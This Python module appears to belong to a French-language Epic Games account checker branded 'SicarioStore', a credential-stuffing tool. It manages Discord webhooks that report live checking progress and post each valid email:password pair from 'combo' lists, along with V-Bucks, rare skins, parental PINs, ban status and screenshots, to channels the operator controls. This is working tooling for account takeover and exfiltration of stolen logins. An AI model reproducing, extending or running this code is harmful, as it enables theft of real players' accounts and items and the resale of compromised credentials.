import os
import io
import json
import time
import requests
import threading
from datetime import datetime, timezone
from typing import Optional
from src.config import config
from src.logger import logger


class WebhookManager:
    def __init__(self):
        self.live_message_id = None
        self.live_start_time = None
        self.total_combos = 0
        self.last_live_update = 0
        self.update_interval = 2.5
        self._lock = threading.Lock()

    def get_webhook_url(self, key: str, fallback_file: Optional[str] = None) -> Optional[str]:
        url = config.get(f"webhooks.{key}")
        if url and str(url).strip().startswith("http"):
            return str(url).strip()
        if fallback_file and os.path.exists(fallback_file):
            try:
                with open(fallback_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                url = data.get("webhook_url") or data.get(key)
                if url and str(url).strip().startswith("http"):
                    return str(url).strip()
            except Exception:
                pass
        return None

    @property
    def live_url(self) -> Optional[str]:
        return self.get_webhook_url("live_url", "live_webhook.json")

    @property
    def hit_url(self) -> Optional[str]:
        return self.get_webhook_url("hit_url")

    @property
    def twofa_url(self) -> Optional[str]:
        return self.get_webhook_url("twofa_url")

    @property
    def shortcode_url(self) -> Optional[str]:
        return self.get_webhook_url("shortcode_url", "shortcode_webhook.json")

    @property
    def screenshot_url(self) -> Optional[str]:
        return self.get_webhook_url("screenshot_url", "screenshot_webhook.json")

    def _post_async(self, url: str, payload: dict, screenshot_bytes: Optional[bytes] = None):
        if not url:
            return

        def _worker():
            try:
                if screenshot_bytes:
                    files = {"file": ("screenshot.jpg", io.BytesIO(screenshot_bytes), "image/jpeg")}
                    data = {"payload_json": json.dumps(payload)}
                    requests.post(url, data=data, files=files, timeout=12)
                else:
                    headers = {"Content-Type": "application/json"}
                    requests.post(url, json=payload, headers=headers, timeout=12)
            except Exception as e:
                logger.debug(f"Webhook post error: {e}")

        threading.Thread(target=_worker, daemon=True).start()

    def start_live(self, total: int):
        self.live_message_id = None
        self.live_start_time = time.time()
        self.total_combos = max(total, 1)
        self.last_live_update = 0
        if self.live_url:
            self.update_live(force=True)

    def _build_progress_bar(self, current: int, total: int, length: int = 14) -> str:
        progress = min(max(current / max(total, 1), 0), 1)
        filled = int(length * progress)
        bar = "█" * filled + "░" * (length - filled)
        return f"[{bar}] {int(progress * 100)}%"

    def update_live(self, force: bool = False):
        url = self.live_url
        if not url:
            return
        now_time = time.time()
        if not force and (now_time - self.last_live_update) < self.update_interval:
            return
        with self._lock:
            self.last_live_update = now_time
        stats = logger.stats
        hits = stats.get("hit", 0)
        twofa = stats.get("2fa", 0)
        bad = stats.get("bad", 0)
        ogs = stats.get("ogs", 0)
        skins = stats.get("skins", 0)
        remain = stats.get("remain", 0)
        done = self.total_combos - remain
        if done < 0:
            done = hits + twofa + bad
        elapsed = int(now_time - (self.live_start_time or now_time))
        elapsed_str = f"{elapsed // 60:02d}m {elapsed % 60:02d}s"
        if elapsed > 0:
            cpm = int(done / max(elapsed, 1) * 60)
        else:
            cpm = 0
        progress_str = f"{self._build_progress_bar(done, self.total_combos)} ({done}/{self.total_combos})"
        embed = {
            "title": "⚡ SicarioStore - Epic Games Checker [LIVE]",
            "description": f"🚀 **Vérification en cours...**\n\n📊 **Progression :** `{progress_str}`",
            "color": 16719902,
            "fields": [
                {"name": f"✅ HIT**`{hits}`**", "value": True, "inline": True},
                {"name": f"🔒 2FA**`{twofa}`**", "value": True, "inline": True},
                {"name": f"❌ BAD**`{bad}`**", "value": True, "inline": True},
                {"name": f"🌟 OGS / Rares**`{ogs}`**", "value": True, "inline": True},
                {"name": f"👕 Total Skins**`{skins}`**", "value": True, "inline": True},
                {"name": f"⚡ Vitesse (CPM)**`{cpm}`** c/min", "value": True, "inline": True},
                {"name": f"⏳ Temps Écoulé**`{elapsed_str}`**", "value": True, "inline": True},
                {"name": f"📋 Restants**`{remain}`**", "value": True, "inline": True},
                {"name": f"🎯 Total Combos**`{self.total_combos}`**", "value": True, "inline": True},
            ],
            "footer": {"text": "SicarioStore • discord.gg/sicariostore"},
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        payload = {
            "username": "SicarioStore Live Checker",
            "avatar_url": "https://cdn.discordapp.com/emojis/1089201944883445771.webp?size=96",
            "embeds": [embed],
        }

        def _live_worker():
            try:
                if self.live_message_id:
                    res = requests.patch(f"{url}/messages/{self.live_message_id}", json=payload, timeout=8)
                    if res.status_code not in (200, 204):
                        self.live_message_id = None
                if not self.live_message_id:
                    res = requests.post(f"{url}?wait=true", json=payload, timeout=8)
                    if res.status_code in (200, 201):
                        self.live_message_id = res.json().get("id")
            except Exception as e:
                logger.debug(f"Live webhook update error: {e}")

        threading.Thread(target=_live_worker, daemon=True).start()

    def finish_live(self):
        url = self.live_url
        if not url:
            return
        now_time = time.time()
        stats = logger.stats
        hits = stats.get("hit", 0)
        twofa = stats.get("2fa", 0)
        bad = stats.get("bad", 0)
        ogs = stats.get("ogs", 0)
        skins = stats.get("skins", 0)
        total = hits + twofa + bad
        elapsed = int(now_time - (self.live_start_time or now_time))
        elapsed_str = f"{elapsed // 60:02d}m {elapsed % 60:02d}s"
        embed = {
            "title": "🎉 SicarioStore - Vérification Terminée !",
            "description": f"✅ **Le check des comptes est terminé avec succès !**\n\n⏱️ **Durée totale :** `{elapsed_str}`",
            "color": 3066993,
            "fields": [
                {"name": f"✅ HITS**`{hits}`**", "value": True, "inline": True},
                {"name": f"🔒 2FA**`{twofa}`**", "value": True, "inline": True},
                {"name": f"❌ BAD**`{bad}`**", "value": True, "inline": True},
                {"name": f"🌟 OGS**`{ogs}`**", "value": True, "inline": True},
                {"name": f"👕 Total Skins**`{skins}`**", "value": True, "inline": True},
                {"name": f"🎯 Total Vérifié**`{total}`**", "value": True, "inline": True},
            ],
            "footer": {"text": "SicarioStore Checker • discord.gg/sicariostore"},
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        payload = {
            "username": "SicarioStore Live Checker",
            "avatar_url": "https://cdn.discordapp.com/emojis/1089201944883445771.webp?size=96",
            "embeds": [embed],
        }

        def _finish_worker():
            try:
                if self.live_message_id:
                    requests.patch(f"{url}/messages/{self.live_message_id}", json=payload, timeout=8)
                else:
                    requests.post(url, json=payload, timeout=8)
            except Exception:
                pass

        threading.Thread(target=_finish_worker, daemon=True).start()

    def send_hit(self, email: str, password: str, account_info: dict, screenshot_bytes: Optional[bytes] = None):
        url = self.hit_url
        if not url:
            return
        info = account_info or {}
        skin_count = info.get("skin_count", 0)
        rare_skins = info.get("rare_skins", [])
        vbucks = info.get("vbucks", 0)
        platforms = info.get("platforms", [])
        is_banned = info.get("is_banned", False)
        ban_reason = info.get("ban_reason", "")
        parental_pin = info.get("parental_pin", "No")
        last_match = info.get("last_match", "Inconnu")
        is_og = len(rare_skins) > 0
        title = "👑 [OG HIT] Compte Rare Détecté !" if is_og else "🔥 [HIT] Nouveau Compte Valide !"
        color = 16766720 if is_og else 3066993
        if parental_pin and parental_pin not in ("No", "Non"):
            pin = f"🔒 Code: `{parental_pin}`"
        else:
            pin = "🔓 Aucun"
        if is_banned:
            ban = f"🔴 Banni ({ban_reason})"
        else:
            ban = "🟢 Propre"
        if platforms:
            platforms_str = " • ".join(f"`{p}`" for p in platforms)
        else:
            platforms_str = "`Aucune`"
        if rare_skins:
            rare_str = ", ".join(f"✨ **{r}**" for r in rare_skins)
        else:
            rare_str = "Aucun"
        if last_match:
            match = str(last_match).split("T")[0]
        else:
            match = "Inconnu"
        embed = {
            "title": title,
            "color": color,
            "fields": [
                {"name": "👤 Identifiants", "value": f"||`{email}:{password}`||", "inline": False},
                {"name": "👕 Skins", "value": f"**{skin_count}** skins", "inline": True},
                {"name": "💰 V-Bucks", "value": f"**{vbucks}** 🪙", "inline": True},
                {"name": "🔒 PIN Parental", "value": pin, "inline": True},
                {"name": "🌟 Skins Rares / OG", "value": rare_str, "inline": False},
                {"name": "🎮 Plateformes Liées", "value": platforms_str, "inline": False},
                {"name": "🚫 Statut Ban", "value": ban, "inline": True},
                {"name": "🕒 Dernière Partie", "value": f"`{match}`", "inline": True},
            ],
            "footer": {"text": "SicarioStore Epic Checker • discord.gg/sicariostore"},
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        if screenshot_bytes:
            embed["image"] = {"url": "attachment://screenshot.jpg"}
        payload = {
            "username": "SicarioStore Hit Notifier",
            "avatar_url": "https://cdn.discordapp.com/emojis/1089201944883445771.webp?size=96",
            "embeds": [embed],
        }
        self._post_async(url, payload, screenshot_bytes)

    def send_twofa(self, email: str, password: str, screenshot_bytes: Optional[bytes] = None):
        url = self.twofa_url or self.hit_url
        if not url:
            return
        embed = {
            "title": "🔒 [2FA REQUIS] Compte Détecté",
            "description": "Le compte est valide mais nécessite un code d'authentification à deux facteurs.",
            "color": 10181046,
            "fields": [
                {"name": "👤 Identifiants", "value": f"||`{email}:{password}`||", "inline": False},
                {"name": "📋 Action", "value": "Sauvegardé dans `output/2fa.txt`", "inline": True},
            ],
            "footer": {"text": "SicarioStore Epic Checker • discord.gg/sicariostore"},
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        if screenshot_bytes:
            embed["image"] = {"url": "attachment://screenshot.jpg"}
        payload = {
            "username": "SicarioStore 2FA Notifier",
            "embeds": [embed],
        }
        self._post_async(url, payload, screenshot_bytes)

    def send_shortcode(self, email: str, password: str, screenshot_bytes: Optional[bytes] = None):
        url = self.shortcode_url
        if not url:
            return
        payload = {"content": f"**{email}:{password}**", "username": "SicarioStore Shortcodes"}
        self._post_async(url, payload, screenshot_bytes)

    def send_screenshot(self, email: str, password: str, screenshot_bytes: Optional[bytes]):
        url = self.screenshot_url
        if not url or not screenshot_bytes:
            return
        payload = {"content": f"📸 Compte vérifié : **{email}:{password}**", "username": "SicarioStore Screenshots"}
        self._post_async(url, payload, screenshot_bytes)

    def test_webhook(self, url: str) -> tuple[bool, str]:
        if not url or not url.strip().startswith("http"):
            return (False, "URL invalide (doit commencer par http:// ou https://)")
        embed = {
            "title": "✅ Test Webhook - SicarioStore EpicChecker",
            "description": "Félicitations ! La connexion avec votre salon Discord fonctionne parfaitement.",
            "color": 3066993,
            "fields": [
                {"name": "Statut", "value": "🟢 En ligne & Connecté", "inline": True},
                {"name": "Date", "value": f"`{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`", "inline": True},
            ],
            "footer": {"text": "SicarioStore • Test de configuration"},
        }
        payload = {"username": "SicarioStore Checker Test", "embeds": [embed]}
        try:
            headers = {"Content-Type": "application/json"}
            res = requests.post(url.strip(), json=payload, headers=headers, timeout=8)
            if res.status_code in (200, 204):
                return (True, "Webhook testé et validé avec succès !")
            return (False, f"Erreur Discord (HTTP {res.status_code}): {res.text[:100]}")
        except Exception as e:
            return (False, f"Échec de connexion : {e}")


webhook_manager = WebhookManager()